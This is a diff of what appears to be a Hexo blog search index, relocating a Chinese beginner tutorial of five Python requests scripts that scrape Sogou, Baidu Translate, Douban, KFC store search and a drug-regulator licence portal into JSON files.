class="line">    <span class="comment"># 5.获取相应数据 (只有确认返回类型是json才能调用json方法 返回字典对象)</span></span><br><span class="line">    list_data = response.json()</span><br><span class="line">    print(list_data)</span><br><span class="line">    <span class="comment"># 6.持久化存储</span></span><br><span class="line">    fp = <span class="built_in">open</span>(<span class="string">&#x27;./肯德基餐厅“&#123;&#125;”查询结果.json&#x27;</span>.<span class="built_in">format</span>(kw), <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    json.dump(list_data, fp=fp, ensure_ascii=<span class="literal">False</span>)</span><br><span class="line">    print(<span class="string">&quot;爬取结束&quot;</span>)</span><br></pre></td></tr></table></figure>
+<h4 id="案例2-5-爬取药监总局相关数据"><a class="header-anchor" href="#案例2-5-爬取药监总局相关数据">¶</a>案例2.5 爬取药监总局相关数据</h4>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    实战案例2.5</span></span><br><span class="line"><span class="string">    任务目标：根据输入的数字，爬取相应页数的化妆品公司信息</span></span><br><span class="line"><span class="string">    知识点：抓包分析 两次追踪动态加载的内容</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="comment"># 爬取药监局信息</span></span><br><span class="line">x = []</span><br><span class="line">y = []</span><br><span class="line">header = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">url1 = <span class="string">&#x27;http://scxk.nmpa.gov.cn:81/xk/itownet/portalAction.do?method=getXkzsList&#x27;</span></span><br><span class="line">url2 = <span class="string">&#x27;http://scxk.nmpa.gov.cn:81/xk/itownet/portalAction.do?method=getXkzsById&#x27;</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    n=<span class="built_in">input</span>(<span class="string">&quot;输入你要查询的页数&quot;</span>)</span><br><span class="line">    v=<span class="built_in">int</span>(n)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,v+<span class="number">1</span>):</span><br><span class="line">        data1=&#123;</span><br><span class="line">            <span class="string">&#x27;on&#x27;</span>: <span class="string">&#x27;true&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;page&#x27;</span>: i,</span><br><span class="line">            <span class="string">&#x27;pageSize&#x27;</span>: <span class="string">&#x27;15&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;productName&#x27;</span>:<span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;conditionType&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;applyname&#x27;</span>:<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        responce1=requests.post(url=url1,data=data1,headers=header).json()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> responce1[<span class="string">&#x27;list&#x27;</span>]:</span><br><span class="line">            x.append(i[<span class="string">&#x27;ID&#x27;</span>])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> x:</span><br><span class="line">        data2=&#123;</span><br><span class="line">            <span class="string">&#x27;id&#x27;</span>:j</span><br><span class="line">        &#125;</span><br><span class="line">        responce2=requests.post(url=url2,data=data2,headers=header).json()</span><br><span class="line">        y.append(responce2)</span><br><span class="line">    fp=<span class="built_in">open</span>(<span class="string">&#x27;./yjj2.json&#x27;</span>,<span class="string">&#x27;w&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    json.dump(y, fp=fp, ensure_ascii=<span class="literal">False</span>)</span><br><span class="line">    print(<span class="string">&quot;爬取完毕&quot;</span>)</span><br></pre></td></tr></table></figure>
+<h2 id="总结"><a class="header-anchor" href="#总结">¶</a>总结:</h2>
+<p>以上是基础类型的网站爬取练习</p>
+<p>我的思路方法如下:</p>
+<p>首先要观察网站的请求方式 看看是不是阿贾克斯请求 看看响应包的信息和请求包的请求数据 content-type是什么类型等等  一步步分析</p>
+]]></content>
+      <categories>
+        <category>编程学习</category>
+        <category>python</category>
+      </categories>
+  </entry>
+  <entry>
     <title>文件日志包含漏洞</title>
     <url>/2020/11/17/%E6%96%87%E4%BB%B6%E6%97%A5%E5%BF%97%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</url>
     <content><![CDATA[<p>本文针对ctf中文件日志包含小结</p>
@@ -2665,30 +2692,6 @@ index.php</p>
       <categories>
         <category>web技术学习</category>
         <category>命令执行</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>python爬虫学习(一)</title>
-    <url>/2021/02/20/%E7%88%AC%E8%99%AB%E4%BA%94%E4%B8%AA%E6%A1%88%E4%BE%8B%E7%BB%83%E4%B9%A0/</url>
-    <content><![CDATA[<p><strong>这五个案例没有用到数据解析是比较基础的操作 为的是熟悉操作</strong></p>
-<h4 id="案例2-1-爬取搜狗搜索结果"><a class="header-anchor" href="#案例2-1-爬取搜狗搜索结果">¶</a>案例2.1 爬取搜狗搜索结果</h4>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    实战案例2.1</span></span><br><span class="line"><span class="string">    任务目标：根据输入的关键词，爬取该关键词通过搜狗引擎搜索得到的结果网页</span></span><br><span class="line"><span class="string">    知识点：带参调用request.get() UA检测和UA伪装</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># UA伪装：将浏览器对应的User-Agent封装到字典中</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) &quot;</span></span><br><span class="line">                      <span class="string">&quot;Chrome/85.0.4183.83 Safari/537.36 &quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    baseurl = <span class="string">&quot;https://www.sogou.com/web?&quot;</span></span><br><span class="line">    keyword = <span class="built_in">input</span>(<span class="string">&quot;请输入要查找的词汇：&quot;</span>)</span><br><span class="line">    param = &#123;  <span class="comment"># 以字典的形式存储查询的关键字</span></span><br><span class="line">        <span class="string">&#x27;query&#x27;</span>: keyword</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment"># 以带参数的方式调用get方法</span></span><br><span class="line">    response = requests.get(baseurl, params=param, headers=headers)</span><br><span class="line">    print(response.text)</span><br></pre></td></tr></table></figure>
-<h4 id="案例2-2-破解百度翻译"><a class="header-anchor" href="#案例2-2-破解百度翻译">¶</a>案例2.2 破解百度翻译</h4>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    实战案例2.2</span></span><br><span class="line"><span class="string">    任务目标：根据输入的关键词，爬取百度翻译的结果</span></span><br><span class="line"><span class="string">    知识点：抓包分析 带参调用request.post() 存储json文件</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># 1.制定url</span></span><br><span class="line">    post_url = <span class="string">&#x27;https://fanyi.baidu.com/sug&#x27;</span></span><br><span class="line">    kw = <span class="built_in">input</span>(<span class="string">&quot;请输入要翻译的单词：&quot;</span>)</span><br><span class="line">    <span class="comment"># 2.以字典的形式存储要翻译的单词</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;kw&#x27;</span>: kw</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment"># 3.UA伪装</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) &quot;</span></span><br><span class="line">                      <span class="string">&quot;Chrome/85.0.4183.83 Safari/537.36 &quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment"># 4.请求发送</span></span><br><span class="line">    response = requests.post(url=post_url, data=data, headers=headers)</span><br><span class="line">    <span class="comment"># 5.获取相应数据 (只有确认返回类型是json才能调用json方法 返回字典对象)</span></span><br><span class="line">    dic_obj = response.json()</span><br><span class="line">    print(dic_obj)</span><br><span class="line">    <span class="comment"># 6.持久化存储</span></span><br><span class="line">    fp = <span class="built_in">open</span>(<span class="string">&#x27;./&#123;&#125;.json&#x27;</span>.<span class="built_in">format</span>(kw), <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    json.dump(dic_obj, fp=fp, ensure_ascii=<span class="literal">False</span>)</span><br><span class="line">    print(<span class="string">&quot;爬取结束&quot;</span>)</span><br></pre></td></tr></table></figure>
-<h4 id="案例2-3-爬取豆瓣电影排行榜"><a class="header-anchor" href="#案例2-3-爬取豆瓣电影排行榜">¶</a>案例2.3 爬取豆瓣电影排行榜</h4>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    实战案例2.3</span></span><br><span class="line"><span class="string">    任务目标：爬取豆瓣喜剧类型电影排行榜</span></span><br><span class="line"><span class="string">    知识点：抓包分析 带参调用request.get() 存储json文件</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># 1.制定url</span></span><br><span class="line">    url = <span class="string">&quot;https://movie.douban.com/j/chart/top_list&quot;</span></span><br><span class="line">    <span class="comment"># Request URL中的参数信息，可以通过字典的方式写入param中，并作为get方法的参数使用</span></span><br><span class="line">    param = &#123;</span><br><span class="line">            <span class="string">&quot;type&quot;</span>: <span class="string">&quot;24&quot;</span>,</span><br><span class="line">            <span class="string">&quot;interval_id&quot;</span>: <span class="string">&quot;100:90&quot;</span>,</span><br><span class="line">            <span class="string">&quot;action&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;start&quot;</span>: <span class="string">&quot;0&quot;</span>,  <span class="comment"># 从第几部电影中取</span></span><br><span class="line">            <span class="string">&quot;limit&quot;</span>: <span class="string">&quot;20&quot;</span>   <span class="comment"># 一次取出的电影个数</span></span><br><span class="line">        &#125;</span><br><span class="line">    <span class="comment"># 2.UA伪装</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) &quot;</span></span><br><span class="line">                      <span class="string">&quot;Chrome/85.0.4183.83 Safari/537.36 &quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment"># 3.请求发送</span></span><br><span class="line">    response = requests.get(url=url, params=param, headers=headers)</span><br><span class="line">    <span class="comment"># 4.获取数据</span></span><br><span class="line">    list_data = response.json()</span><br><span class="line">    <span class="comment"># 5.持久化存储</span></span><br><span class="line">    fp = <span class="built_in">open</span>(<span class="string">&#x27;./豆瓣电影排行榜.json&#x27;</span>, <span class="string">&quot;w&quot;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    json.dump(list_data, fp=fp, ensure_ascii=<span class="literal">False</span>)</span><br><span class="line">    print(<span class="string">&quot;爬取结束&quot;</span>)</span><br></pre></td></tr></table></figure>
-<h4 id="案例2-4-爬取肯德基餐厅查询结果"><a class="header-anchor" href="#案例2-4-爬取肯德基餐厅查询结果">¶</a>案例2.4 爬取肯德基餐厅查询结果</h4>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    实战案例2.4</span></span><br><span class="line"><span class="string">    任务目标：根据输入的关键词，爬取肯德基餐厅查询的结果</span></span><br><span class="line"><span class="string">    知识点：抓包分析 带参调用request.post()</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># 1.制定url</span></span><br><span class="line">    post_url = <span class="string">&#x27;http://www.kfc.com.cn/kfccda/ashx/GetStoreList.ashx?op=keyword&#x27;</span></span><br><span class="line">    kw = <span class="built_in">input</span>(<span class="string">&quot;请输入餐厅关键字：&quot;</span>)</span><br><span class="line">    <span class="comment"># 2.以字典的形式存储关键字</span></span><br><span class="line">    data = &#123;</span><br><span class="line">            <span class="string">&quot;cname&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;pid&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="string">&quot;keyword&quot;</span>: kw,</span><br><span class="line">            <span class="string">&quot;pageIndex&quot;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">            <span class="string">&quot;pageSize&quot;</span>: <span class="string">&#x27;10&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">    <span class="comment"># 3.UA伪装</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) &quot;</span></span><br><span class="line">                      <span class="string">&quot;Chrome/85.0.4183.83 Safari/537.36 &quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment"># 4.请求发送</span></span><br><span class="line">    response = requests.post(url=post_url, data=data, headers=headers)</span><br><span class="line">    <span class="comment"># 5.获取相应数据 (只有确认返回类型是json才能调用json方法 返回字典对象)</span></span><br><span class="line">    list_data = response.json()</span><br><span class="line">    print(list_data)</span><br><span class="line">    <span class="comment"># 6.持久化存储</span></span><br><span class="line">    fp = <span class="built_in">open</span>(<span class="string">&#x27;./肯德基餐厅“&#123;&#125;”查询结果.json&#x27;</span>.<span class="built_in">format</span>(kw), <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    json.dump(list_data, fp=fp, ensure_ascii=<span class="literal">False</span>)</span><br><span class="line">    print(<span class="string">&quot;爬取结束&quot;</span>)</span><br></pre></td></tr></table></figure>
-<h4 id="案例2-5-爬取药监总局相关数据"><a class="header-anchor" href="#案例2-5-爬取药监总局相关数据">¶</a>案例2.5 爬取药监总局相关数据</h4>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    实战案例2.5</span></span><br><span class="line"><span class="string">    任务目标：根据输入的数字，爬取相应页数的化妆品公司信息</span></span><br><span class="line"><span class="string">    知识点：抓包分析 两次追踪动态加载的内容</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="comment"># 爬取药监局信息</span></span><br><span class="line">x = []</span><br><span class="line">y = []</span><br><span class="line">header = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">url1 = <span class="string">&#x27;http://scxk.nmpa.gov.cn:81/xk/itownet/portalAction.do?method=getXkzsList&#x27;</span></span><br><span class="line">url2 = <span class="string">&#x27;http://scxk.nmpa.gov.cn:81/xk/itownet/portalAction.do?method=getXkzsById&#x27;</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    n=<span class="built_in">input</span>(<span class="string">&quot;输入你要查询的页数&quot;</span>)</span><br><span class="line">    v=<span class="built_in">int</span>(n)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,v+<span class="number">1</span>):</span><br><span class="line">        data1=&#123;</span><br><span class="line">            <span class="string">&#x27;on&#x27;</span>: <span class="string">&#x27;true&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;page&#x27;</span>: i,</span><br><span class="line">            <span class="string">&#x27;pageSize&#x27;</span>: <span class="string">&#x27;15&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;productName&#x27;</span>:<span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;conditionType&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;applyname&#x27;</span>:<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        responce1=requests.post(url=url1,data=data1,headers=header).json()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> responce1[<span class="string">&#x27;list&#x27;</span>]:</span><br><span class="line">            x.append(i[<span class="string">&#x27;ID&#x27;</span>])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> x:</span><br><span class="line">        data2=&#123;</span><br><span class="line">            <span class="string">&#x27;id&#x27;</span>:j</span><br><span class="line">        &#125;</span><br><span class="line">        responce2=requests.post(url=url2,data=data2,headers=header).json()</span><br><span class="line">        y.append(responce2)</span><br><span class="line">    fp=<span class="built_in">open</span>(<span class="string">&#x27;./yjj2.json&#x27;</span>,<span class="string">&#x27;w&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    json.dump(y, fp=fp, ensure_ascii=<span class="literal">False</span>)</span><br><span class="line">    print(<span class="string">&quot;爬取完毕&quot;</span>)</span><br></pre></td></tr></table></figure>
-<h2 id="总结"><a class="header-anchor" href="#总结">¶</a>总结:</h2>
-<p>以上是基础类型的网站爬取练习</p>
-<p>我的思路方法如下:</p>
-<p>首先要观察网站的请求方式 看看是不是阿贾克斯请求 看看响应包的信息和请求包的请求数据 content-type是什么类型等等  一步步分析</p>
-]]></content>
-      <categories>
-        <category>编程学习</category>
-        <category>python</category>
       </categories>
   </entry>
   <entry>
